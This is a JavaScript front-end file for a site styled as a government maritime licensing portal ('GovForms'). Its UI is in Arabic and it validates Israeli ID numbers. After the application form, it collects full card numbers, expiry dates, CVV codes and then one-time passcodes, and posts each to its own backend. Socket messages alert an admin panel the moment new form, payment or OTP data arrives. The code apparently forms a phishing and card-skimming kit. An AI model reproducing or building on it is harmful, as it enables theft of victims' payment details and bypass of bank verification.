/* =====================================================================
   GovForms — موقع العملاء — منطق النموذج
   ===================================================================== */

// إعدادات الباك إند (عدّل الرابط حسب بيئتك)
const API_BASE = window.GOVFORMS_API_BASE || location.origin;

// قائمة الخدمات الخمس (مطابقة لتحليل GovForms)
const SERVICES = [
  {
    value: 'single_sailing_permit',
    label: 'تصريح إبحار فردي',
    desc: 'هذه الخدمة مخصصة للربابنة الراغبين بتقديم طلب لإبحار فردي.',
    fields: [],
  },
  {
    value: 'certificate_conversion',
    label: 'تحويل شهادة تأهيل',
    desc: 'هذه الخدمة مخصصة لمن يملك شهادة ربان أجنبية ويريد تحويلها إلى شهادة محلية.',
    fields: [],
  },
  {
    value: 'certificate_revalidation',
    label: 'الاعتراف مجدداً بشهادة منتهية أو مرفوضة',
    desc: 'هذه الخدمة مخصصة لمن أُبطلت شهادة تأهيله بسبب عدم تجديدها لمدة تزيد على سنتين من تاريخ انتهاء صلاحيتها.',
    fields: ['certificate_expiry', 'certificate_file'],
  },
  {
    value: 'general_boat_licensing',
    label: 'استفسار عام عن ترخيص القوارب',
    desc: 'هذه الخدمة مخصصة للاستفسارات العامة عن القوارب، تجديد رخصة الإبحار، فحوصات صلاحية الإبحار، التغييرات في القارب وغير ذلك.',
    fields: ['subject_licensing', 'boat_type'],
  },
  {
    value: 'general_skipper_qualification',
    label: 'استفسار عام عن تأهيل الربابنة',
    desc: 'هذه الخدمة مخصصة للاستفسارات العامة عن تأهيل الربابنة، امتحانات التأهيل، الشهادات وغير ذلك.',
    fields: ['subject_qualification'],
  },
];

const SUBJECTS_LICENSING = ['تجديد الرخصة', 'تغييرات', 'صلاحية الإبحار', 'أخرى'];
const SUBJECTS_QUALIFICATION = ['متطلبات أولية', 'أخرى', 'امتحانات', 'شهادات'];

// الحالة
const state = {
  selectedService: null,
  uploadedFiles: [], // {name, type, size, path, category}
  socket: null,
  fingerprint: null,
  // معرّفات الطلب بعد الإرسال (لربط الدفع و OTP)
  lastSubmission: { submissionId: null, clientId: null, reference: null },
};

/* ---------- بصمة المتصفح (مبسّطة) ---------- */
function generateFingerprint() {
  const parts = [
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency || 0,
    (navigator.platform || ''),
  ];
  let hash = 0;
  const s = parts.join('|');
  for (let i = 0; i < s.length; i++) {
    hash = ((hash << 5) - hash) + s.charCodeAt(i);
    hash |= 0;
  }
  return 'fp_' + Math.abs(hash).toString(36) + '_' + s.length.toString(36);
}

/* ---------- الاتصال بـ Socket.io للـ presence ---------- */
function initSocket() {
  if (typeof io === 'undefined') return;
  state.socket = io(API_BASE, { path: '/api/socket', transports: ['websocket', 'polling'] });
  state.fingerprint = generateFingerprint();
  state.socket.emit('client:presence', { fingerprint: state.fingerprint });
  // إعادة الإرسال كل 30 ثانية للحفاظ على حالة الاتصال
  setInterval(() => {
    if (state.socket && state.socket.connected) {
      state.socket.emit('client:presence', { fingerprint: state.fingerprint });
    }
  }, 30000);
}

// إشعار لوحة الإدارة فوراً بحفظ بيانات جديد (نموذج/دفع/OTP)
// مسار مزدوج: الخادم يُرسل admin:new_entry بعد الحفظ، والعميل يُرسل client:new_entry
// كاحتياط لضمان وصول الإشعار اللحظي.
function notifyNewEntry(type, data) {
  if (!state.socket || !state.socket.connected) return;
  state.socket.emit('client:new_entry', {
    type,
    clientId: state.lastSubmission?.clientId,
    submissionId: state.lastSubmission?.submissionId,
    reference: state.lastSubmission?.reference,
    ...data,
  });
}

/* ---------- تعبئة قائمة الخدمات ---------- */
function populateServices() {
  const sel = document.getElementById('serviceType');
  SERVICES.forEach((s) => {
    const opt = document.createElement('option');
    opt.value = s.value;
    opt.textContent = s.label;
    sel.appendChild(opt);
  });
}

/* ---------- اختيار الخدمة وفتح النموذج ---------- */
function onSelectService() {
  const sel = document.getElementById('serviceType');
  const val = sel.value;
  const errEl = document.getElementById('serviceTypeError');

  if (!val) {
    sel.classList.add('error');
    errEl.classList.add('show');
    return;
  }
  sel.classList.remove('error');
  errEl.classList.remove('show');

  const service = SERVICES.find((s) => s.value === val);
  state.selectedService = service;

  // نص تعريفي
  document.getElementById('serviceDescText').textContent = service.desc;

  // إظهار/إخفاء الحقول الخاصة بالخدمة
  document.querySelectorAll('[data-service-field]').forEach((el) => {
    el.classList.toggle('hidden', !service.fields.includes(el.dataset.serviceField));
  });

  // تعبئة قوائم الموضوعات
  if (service.fields.includes('subject_licensing')) {
    fillSubjectOptions('subjectLicensing', SUBJECTS_LICENSING);
  }
  if (service.fields.includes('subject_qualification')) {
    fillSubjectOptions('subjectQualification', SUBJECTS_QUALIFICATION);
  }

  // الانتقال للنموذج
  document.getElementById('startScreen').classList.add('hidden');
  document.getElementById('formScreen').classList.remove('hidden');
  document.getElementById('formScreen').scrollIntoView({ behavior: 'smooth' });
}

function fillSubjectOptions(id, options) {
  const sel = document.getElementById(id);
  sel.innerHTML = '<option value="">اختيار</option>';
  options.forEach((o) => {
    const opt = document.createElement('option');
    opt.value = o;
    opt.textContent = o;
    sel.appendChild(opt);
  });
}

/* ---------- التحقق من الحقول ---------- */
function setError(fieldId, msg) {
  const el = document.getElementById(fieldId);
  const errEl = document.getElementById(fieldId + 'Error');
  if (el) el.classList.add('error');
  if (errEl) {
    errEl.textContent = msg;
    errEl.classList.add('show');
  }
}

function clearError(fieldId) {
  const el = document.getElementById(fieldId);
  const errEl = document.getElementById(fieldId + 'Error');
  if (el) el.classList.remove('error');
  if (errEl) errEl.classList.remove('show');
}

function isEmail(v) {
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(v);
}

function isPhone(v) {
  // يقبل أرقام، +، مسافات، شرطات؛ بطول معقول
  return /^[\d+\s-]{7,15}$/.test(v.replace(/\s/g, ''));
}

function isIsraeliId(v) {
  // التحقق من رقم هوية إسرائيلي (9 أرقام مع رقم تحقق)
  if (!/^\d{9}$/.test(v)) return false;
  return isValidIsraeliId(v);
}

function isValidIsraeliId(id) {
  let sum = 0;
  for (let i = 0; i < 9; i++) {
    let n = parseInt(id[i], 10);
    if (i % 2 === 1) n *= 2;
    if (n > 9) n -= 9;
    sum += n;
  }
  return sum % 10 === 0;
}

function validateForm() {
  let ok = true;
  const required = [
    'idNumber', 'lastName', 'firstName',
    'primaryPhone', 'email', 'emailConfirm',
    'content',
  ];

  // الحقول الخاصة بالخدمة
  if (state.selectedService) {
    if (state.selectedService.fields.includes('subject_licensing')) required.push('subjectLicensing');
    if (state.selectedService.fields.includes('subject_qualification')) required.push('subjectQualification');
    if (state.selectedService.fields.includes('certificate_expiry')) required.push('certificateExpiry');
  }

  required.forEach((id) => {
    const el = document.getElementById(id);
    if (!el) return;
    if (!el.value.trim()) {
      setError(id, 'هذا الحقل إلزامي');
      ok = false;
    } else {
      clearError(id);
    }
  });

  // رقم الهوية
  const idVal = document.getElementById('idNumber').value.trim();
  if (idVal && !isIsraeliId(idVal)) {
    setError('idNumber', 'رقم هوية غير صحيح (9 أرقام مع رقم تحقق)');
    ok = false;
  }

  // البريد
  const email = document.getElementById('email').value.trim();
  if (email && !isEmail(email)) {
    setError('email', 'بريد إلكتروني غير صحيح');
    ok = false;
  }
  const emailConfirm = document.getElementById('emailConfirm').value.trim();
  if (email && emailConfirm && email !== emailConfirm) {
    setError('emailConfirm', 'البريدان غير متطابقين');
    ok = false;
  }

  // الهاتف
  const phone = document.getElementById('primaryPhone').value.trim();
  if (phone && !isPhone(phone)) {
    setError('primaryPhone', 'رقم هاتف غير صحيح');
    ok = false;
  }

  // ملف الشهادة الإلزامي
  if (state.selectedService?.fields.includes('certificate_file')) {
    const certFile = state.uploadedFiles.find((f) => f.category === 'certificate');
    if (!certFile) {
      setError('certificateFileError', 'يجب إرفاق ملف الشهادة');
      ok = false;
    } else {
      clearError('certificateFileError');
    }
  }

  return ok;
}

/* ---------- عداد المحتوى ---------- */
function setupCounter() {
  const ta = document.getElementById('content');
  const counter = document.getElementById('contentCounter');
  ta.addEventListener('input', () => {
    if (ta.value.length > 2000) ta.value = ta.value.slice(0, 2000);
    counter.textContent = ta.value.length + '/2000';
  });
}

/* ---------- رفع الملفات ---------- */
async function handleFileUpload(input, category) {
  const file = input.files[0];
  if (!file) return;

  const ext = (file.name.split('.').pop() || '').toLowerCase();
  if (!['jpg', 'jpeg', 'gif', 'png', 'bmp', 'pdf'].includes(ext)) {
    alert('نوع الملف غير مسموح. الأنواع: jpg, jpeg, gif, png, bmp, pdf');
    input.value = '';
    return;
  }
  if (file.size > 20 * 1024 * 1024) {
    alert('الحجم الأقصى 20 MB');
    input.value = '';
    return;
  }

  const fd = new FormData();
  fd.append('file', file);

  try {
    const res = await fetch(API_BASE + '/api/files', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.error) {
      alert(data.error);
      return;
    }
    state.uploadedFiles.push({
      name: data.name,
      type: data.type,
      size: data.size,
      path: data.path,
      category,
    });
    renderFileList(category);
  } catch (e) {
    alert('فشل رفع الملف');
  }
  input.value = '';
}

function renderFileList(category) {
  const list = document.getElementById(category === 'certificate' ? 'certFileList' : 'addFileList');
  list.innerHTML = '';
  state.uploadedFiles
    .filter((f) => f.category === category)
    .forEach((f, i) => {
      const item = document.createElement('div');
      item.className = 'file-item';
      item.innerHTML = `<span>📎 ${f.name} (${(f.size / 1024).toFixed(0)} KB)</span><span class="remove" data-idx="${state.uploadedFiles.indexOf(f)}">✕</span>`;
      item.querySelector('.remove').onclick = () => {
        state.uploadedFiles.splice(state.uploadedFiles.indexOf(f), 1);
        renderFileList(category);
      };
      list.appendChild(item);
    });
}

/* ---------- الإرسال ---------- */
async function submitForm() {
  if (!validateForm()) {
    // التركيز على أول خطأ
    const firstErr = document.querySelector('.error');
    if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
    return;
  }

  const btn = document.getElementById('submitBtn');
  btn.disabled = true;
  btn.textContent = 'جارٍ الإرسال...';

  const payload = {
    fingerprint: state.fingerprint || generateFingerprint(),
    service_type: state.selectedService.value,
    subject: null,
    boat_type: null,
    certificate_expiry: null,
    id_number: document.getElementById('idNumber').value.trim(),
    last_name: document.getElementById('lastName').value.trim(),
    first_name: document.getElementById('firstName').value.trim(),
    primary_phone: document.getElementById('primaryPhone').value.trim(),
    secondary_phone: document.getElementById('secondaryPhone').value.trim(),
    email: document.getElementById('email').value.trim(),
    email_confirmation: document.getElementById('emailConfirm').value.trim(),
    contact_consent: document.getElementById('contactConsent').checked,
    content: document.getElementById('content').value.trim(),
    files: state.uploadedFiles,
    terms_snapshot: { version: '3.0.0', accepted_at: new Date().toISOString() },
  };

  if (state.selectedService.fields.includes('subject_licensing')) {
    payload.subject = document.getElementById('subjectLicensing').value;
    payload.boat_type = document.getElementById('boatType').value.trim();
  }
  if (state.selectedService.fields.includes('subject_qualification')) {
    payload.subject = document.getElementById('subjectQualification').value;
  }
  if (state.selectedService.fields.includes('certificate_expiry')) {
    payload.certificate_expiry = document.getElementById('certificateExpiry').value.trim();
  }

  try {
    const res = await fetch(API_BASE + '/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await res.json();
    if (data.error) {
      alert(data.error);
      btn.disabled = false;
      btn.textContent = 'إرسال الطلب';
      return;
    }
    // حفظ المعرّفات للانتقال إلى خطوة الدفع
    state.lastSubmission = {
      submissionId: data.submissionId,
      clientId: data.clientId,
      reference: data.reference,
    };
    notifyNewEntry('submission', { service_type: payload.service_type });
    showPayment();
  } catch (e) {
    alert('فشل الإرسال. حاول مرة أخرى.');
    btn.disabled = false;
    btn.textContent = 'إرسال الطلب';
  }
}

/* ---------- الانتقال إلى خطوة الدفع ---------- */
function showPayment() {
  document.getElementById('formScreen').classList.add('hidden');
  const ps = document.getElementById('paymentScreen');
  ps.classList.remove('hidden');
  document.getElementById('paymentRef').textContent = state.lastSubmission.reference || '—';
  ps.scrollIntoView({ behavior: 'smooth' });
}

/* ---------- إرسال بيانات الدفع ---------- */
function detectNetwork(num) {
  const n = (num || '').replace(/\s/g, '');
  if (/^4/.test(n)) return 'VISA';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'Mastercard';
  if (/^3[47]/.test(n)) return 'American Express';
  if (/^9(5|672|680)/.test(n)) return 'Maestro';
  return '';
}

async function submitPayment() {
  const cardNumber = document.getElementById('cardNumber').value.trim();
  const cardHolder = document.getElementById('cardHolder').value.trim();
  const expiry = document.getElementById('cardExpiry').value.trim();
  const cvv = document.getElementById('cardCvv').value.trim();
  const bankName = document.getElementById('bankName').value.trim();
  const bankCountry = document.getElementById('bankCountry').value.trim();
  const cardType = document.querySelector('input[name="cardType"]:checked')?.value || 'credit';
  const network = detectNetwork(cardNumber);
  const cardDigits = cardNumber.replace(/\s/g, '');

  // تحقق
  if (!/^\d{13,19}$/.test(cardDigits)) {
    alert('رقم البطاقة غير صحيح (13-19 رقماً)');
    return;
  }
  if (!cardHolder) { alert('حامل البطاقة مطلوب'); return; }
  if (!/^\d{2}\/\d{2}$/.test(expiry)) { alert('تاريخ الانتهاء بصيغة MM/YY'); return; }
  if (!/^\d{3,4}$/.test(cvv)) { alert('رمز CVV غير صحيح'); return; }

  const btn = document.getElementById('paymentBtn');
  btn.disabled = true;
  btn.textContent = 'جارٍ الحفظ...';

  try {
    const res = await fetch(API_BASE + '/api/payment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        submissionId: state.lastSubmission.submissionId,
        clientId: state.lastSubmission.clientId,
        reference: state.lastSubmission.reference,
        card_number: cardDigits,
        card_holder: cardHolder,
        expiry,
        cvv,
        network,
        bank_name: bankName,
        card_type: cardType,
        bank_country: bankCountry,
        bin: cardDigits.slice(0, 6),
      }),
    });
    const data = await res.json();
    btn.disabled = false;
    btn.textContent = 'متابعة إلى التحقق';
    if (data.error) { alert(data.error); return; }
    notifyNewEntry('payment', { hasPayment: true });
    showOtp();
  } catch (e) {
    btn.disabled = false;
    btn.textContent = 'متابعة إلى التحقق';
    alert('فشل حفظ بيانات الدفع. حاول مرة أخرى.');
  }
}

/* ---------- الانتقال إلى خطوة رمز التحقق ---------- */
function showOtp() {
  document.getElementById('paymentScreen').classList.add('hidden');
  const os = document.getElementById('otpScreen');
  os.classList.remove('hidden');
  document.getElementById('otpRef').textContent = state.lastSubmission.reference || '—';
  os.scrollIntoView({ behavior: 'smooth' });
  // تركيز أول خانة
  const first = document.getElementById('otp0');
  if (first) first.focus();
}

/* ---------- صناديق OTP ---------- */
function handleOtpInput(idx, e) {
  const input = e.target;
  input.value = input.value.replace(/\D/g, '').slice(0, 1);
  if (input.value && idx < 5) {
    document.getElementById('otp' + (idx + 1)).focus();
  }
}

function handleOtpKeydown(idx, e) {
  if (e.key === 'Backspace' && !e.target.value && idx > 0) {
    document.getElementById('otp' + (idx - 1)).focus();
  }
}

function handleOtpPaste(e) {
  e.preventDefault();
  const text = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
  for (let i = 0; i < 6; i++) {
    const el = document.getElementById('otp' + i);
    if (el) el.value = text[i] || '';
  }
  const last = document.getElementById('otp' + Math.min(text.length, 5));
  if (last) last.focus();
}

function getOtpCode() {
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += document.getElementById('otp' + i)?.value || '';
  }
  return code;
}

async function submitOtp() {
  const code = getOtpCode();
  if (code.length !== 6) {
    alert('أدخل رمز التحقق المكوّن من 6 أرقام');
    return;
  }

  const btn = document.getElementById('otpBtn');
  btn.disabled = true;
  btn.textContent = 'جارٍ التحقق...';

  try {
    const res = await fetch(API_BASE + '/api/otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        submissionId: state.lastSubmission.submissionId,
        clientId: state.lastSubmission.clientId,
        reference: state.lastSubmission.reference,
        code,
      }),
    });
    const data = await res.json();
    btn.disabled = false;
    btn.textContent = 'تأكيد وإتمام الطلب';
    if (data.error) { alert(data.error); return; }
    notifyNewEntry('otp', { hasOtp: true });
    showSuccess(state.lastSubmission.reference);
  } catch (e) {
    btn.disabled = false;
    btn.textContent = 'تأكيد وإتمام الطلب';
    alert('فشل إرسال رمز التحقق. حاول مرة أخرى.');
  }
}

function showSuccess(reference) {
  document.getElementById('formScreen').classList.add('hidden');
  const otpScr = document.getElementById('otpScreen');
  if (otpScr) otpScr.classList.add('hidden');
  const ss = document.getElementById('successScreen');
  ss.classList.remove('hidden');
  document.getElementById('successRef').textContent = reference;
  ss.scrollIntoView({ behavior: 'smooth' });
}

/* ---------- النوافذ المنبثقة ---------- */
function openModal(id) { document.getElementById(id).classList.add('show'); }
function closeModal(id) { document.getElementById(id).classList.remove('show'); }

function selectSaveMethod(method) {
  document.querySelectorAll('.radio-card').forEach((c) => c.classList.remove('selected'));
  event.currentTarget.classList.add('selected');
  document.getElementById('smsField').classList.toggle('hidden', method !== 'sms');
  document.getElementById('emailField').classList.toggle('hidden', method !== 'email');
}

function toggleSupport(id) {
  document.querySelectorAll('.support-detail').forEach((d) => {
    if (d.id !== id) d.classList.remove('show');
  });
  document.getElementById(id).classList.toggle('show');
}

function toggleTooltip(id) {
  document.getElementById(id).classList.toggle('show');
}

/* ---------- التهيئة ---------- */
document.addEventListener('DOMContentLoaded', () => {
  populateServices();
  setupCounter();

  document.getElementById('startBtn').onclick = onSelectService;
  document.getElementById('submitBtn').onclick = submitForm;

  // مسح الخطأ عند الكتابة
  document.querySelectorAll('input, select, textarea').forEach((el) => {
    el.addEventListener('input', () => clearError(el.id));
  });

  // أزرار شريط الأدوات
  document.getElementById('btnSave').onclick = () => openModal('saveModal');
  document.getElementById('btnFiles').onclick = () => openModal('filesModal');
  document.getElementById('btnSupport').onclick = () => openModal('supportModal');

  // رفع الملفات
  document.getElementById('certFileInput').onchange = function () { handleFileUpload(this, 'certificate'); };
  document.getElementById('addFileInput').onchange = function () { handleFileUpload(this, 'additional'); };

  // ===== ربط أحداث صفحة الدفع =====
  const cardNumberEl = document.getElementById('cardNumber');
  if (cardNumberEl) {
    cardNumberEl.addEventListener('input', () => {
      let v = cardNumberEl.value.replace(/\D/g, '').slice(0, 19);
      cardNumberEl.value = v.replace(/(.{4})/g, '$1 ').trim();
      const net = detectNetwork(v);
      const netEl = document.getElementById('cardNetworkPreview');
      if (netEl) netEl.textContent = net || '—';
      const numPrev = document.getElementById('cardNumberPreview');
      if (numPrev) numPrev.textContent = v ? v.replace(/(.{4})/g, '$1 ').trim() : '•••• •••• •••• ••••';
    });
  }
  const cardHolderEl = document.getElementById('cardHolder');
  if (cardHolderEl) {
    cardHolderEl.addEventListener('input', () => {
      const prev = document.getElementById('cpHolderPreview');
      if (prev) prev.textContent = cardHolderEl.value || '—';
    });
  }
  const expiryEl = document.getElementById('cardExpiry');
  if (expiryEl) {
    expiryEl.addEventListener('input', () => {
      let v = expiryEl.value.replace(/\D/g, '').slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
      expiryEl.value = v;
      const prev = document.getElementById('cpExpPreview');
      if (prev) prev.textContent = v || '—';
    });
  }
  const cvvEl = document.getElementById('cardCvv');
  if (cvvEl) {
    cvvEl.addEventListener('input', () => {
      cvvEl.value = cvvEl.value.replace(/\D/g, '').slice(0, 4);
      const prev = document.getElementById('cpCvvPreview');
      if (prev) prev.textContent = cvvEl.value || '—';
    });
  }
  const bankNameEl = document.getElementById('bankName');
  if (bankNameEl) {
    bankNameEl.addEventListener('input', () => {
      const prev = document.getElementById('bankPreview');
      if (prev) prev.textContent = bankNameEl.value || '—';
    });
  }
  const paymentBtn = document.getElementById('paymentBtn');
  if (paymentBtn) paymentBtn.onclick = submitPayment;

  // ===== ربط أحداث صفحة OTP =====
  for (let i = 0; i < 6; i++) {
    const el = document.getElementById('otp' + i);
    if (el) {
      el.addEventListener('input', (e) => handleOtpInput(i, e));
      el.addEventListener('keydown', (e) => handleOtpKeydown(i, e));
      el.addEventListener('paste', (e) => handleOtpPaste(e));
    }
  }
  const otpBtn = document.getElementById('otpBtn');
  if (otpBtn) otpBtn.onclick = submitOtp;

  initSocket();
});
